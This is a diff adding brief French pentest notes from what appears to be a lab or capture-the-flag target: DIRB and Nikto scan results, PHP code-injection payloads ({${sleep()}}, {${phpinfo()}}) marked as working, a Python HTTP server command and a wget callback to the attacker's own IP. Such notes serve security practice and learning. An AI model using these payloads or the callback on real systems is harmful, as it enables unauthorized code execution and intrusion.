@@ -1,0 +1,50 @@
+DIRB result :
+
+GENERATED WORDS: 4612                                                          
+
+---- Scanning URL: http://138.68.182.108:31219/ ----
+==> DIRECTORY: http://138.68.182.108:31219/assets/                                                               
+==> DIRECTORY: http://138.68.182.108:31219/controllers/                                                          
+==> DIRECTORY: http://138.68.182.108:31219/models/                                                               
+==> DIRECTORY: http://138.68.182.108:31219/static/                                                               
+==> DIRECTORY: http://138.68.182.108:31219/views/                                                                
+                                                                                                                 
+---- Entering directory: http://138.68.182.108:31219/assets/ ----
+                                                                                                                 
+---- Entering directory: http://138.68.182.108:31219/controllers/ ----
+                                                                                                                 
+---- Entering directory: http://138.68.182.108:31219/models/ ----
+                                                                                                                 
+---- Entering directory: http://138.68.182.108:31219/static/ ----
+==> DIRECTORY: http://138.68.182.108:31219/static/css/                                                           
+==> DIRECTORY: http://138.68.182.108:31219/static/js/                                                            
+                                                                                                                 
+---- Entering directory: http://138.68.182.108:31219/views/ ----
++ http://138.68.182.108:31219/views/index.php (CODE:200|SIZE:1750)                                               
+                                                                                                                 
+---- Entering directory: http://138.68.182.108:31219/static/css/ ----
+                                                                                                                 
+---- Entering directory: http://138.68.182.108:31219/static/js/ ----
+
+NIKTO result :
+
+OSVDB-6694
+
+injection php qui fonctionne :
+
+{${sleep(20)}}
+{${sleep(20)}}
+{${sleep(3)}}
+{${sleep(3)}}
+
+php info de merde :
+
+{${phpinfo()}}
+
+lancer port 8080 :
+
+python -m SimpleHTTPServer 8080
+
+recup ip :
+
+ wget -O- http://$(wget -qO- icanhazip.com):8080/lol 
